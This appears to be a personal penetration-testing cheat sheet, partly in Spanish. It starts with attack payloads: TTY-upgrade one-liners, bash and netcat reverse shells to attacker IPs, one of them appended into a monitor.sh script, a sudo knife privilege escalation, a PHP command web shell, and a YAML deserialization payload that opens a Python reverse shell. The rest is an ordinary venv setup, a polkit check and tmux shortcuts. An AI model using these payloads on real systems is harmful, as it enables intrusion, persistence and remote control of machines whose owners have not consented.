printf "\x02\x61\x72\x63\x68\x69\x76\x65\x5f\x69\x6e\x74\x61\x6b\x65"

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
unified - terminal
```
script /dev/null -c bash
```
sqlmap - terminal
```
bash -c "bash -i >& /dev/tcp/{your_IP}/333 0>&1"
```
knife - terminal
```bash
sudo /usr/bin/knife exec -E 'system("/bin/bash")'
```

linux
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 33 >/tmp/f' | tee -a monitor.sh
```
windows
```
nishang
```
php
```
<?php echo system($_GET['cmd']); ?>
system($_GET['cmd']);
```
yaml - exploit
```bash
- !!python/object/apply:subprocess.Popen
  - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.159.218',333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"]
```

```bash
cd /ruta/a/tu/carpeta/crypto_false_witness 
python3 -m venv venv 
source venv/bin/activate 
pip install pycryptodome
#command to exit
deactivate
```

```
dpkg -l | grep -i polkit
```
#### Iniciar y salir
- **`tmux`**: Inicia una nueva sesión anónima.
- **`tmux new -s mi_sesion`**: Inicia una sesión nombrada (muy útil para organizar tareas).
- **`exit`** (o `Ctrl + d`): Cierra el panel o ventana actual. Si cierras todos, la sesión termina.
### 1. Prefijo y Control General
- **`Ctrl + a`** : Tecla de prefijo principal.
- **`Ctrl + a` + `a`** : Cambiar rápidamente a la ventana anterior (_last-window_).
- **`Ctrl + a` + `r`** : Recargar el archivo de configuración (`~/.tmux.conf`).
- **`Ctrl + a` + `d`** : Salir de Tmux manteniendo la sesión en segundo plano (_detach_).
### 2. Gestión de Paneles (Splits y Control)
- **`Ctrl + a` + `|`** : Dividir el panel **horizontalmente** (crea un panel al lado).
- **`Ctrl + a` + `-`** : Dividir el panel **verticalmente** (crea un panel abajo).
- **`Ctrl + a` + `Ctrl + o`** : Rotar/intercambiar paneles cíclicamente.
- **`Ctrl + a` + `:`** y escribir `kill-pane` : Cerrar/matar un panel a la fuerza (si está congelado).
- **`exit`** o **`Ctrl + d`** : Cerrar un panel de forma normal.
### 3. Navegación y Gestión de Ventanas (_Tabs_)
- **`Ctrl + PageDown`** : Ir a la ventana siguiente.
- **`Ctrl + PageUp`** : Ir a la ventana anterior.
### 4. Modo Copia y Vi-Mode
- **`Ctrl + a` + `Enter`** : Entrar en modo copia y subir una línea.
- **`v`** _(en modo copia)_ : Comenzar la selección de texto (_begin-selection_).
- **`y`** _(en modo copia)_ : Copiar texto seleccionado al portapapeles.
- **`Ctrl + v`** _(en modo copia)_ : Activar selección en bloque/rectángulo.
- **`Escape`** : Cancelar el modo copia.
### 5. Recuperación y Sesiones (Fuera de Tmux)
- **`tmux attach`** : Volver a entrar a la última sesión activa en segundo plano.
- **`tmux ls`** : Listar todas las sesiones de Tmux abiertas.
- **`tmux attach -t <nombre>`** : Entrar a una sesión específica por su nombre o número.
- **`tmux kill-session -t ABC`** : eliminacion 

- **`tmux set-environment -t ABC MI_VARIABLE "mi_valor"`**
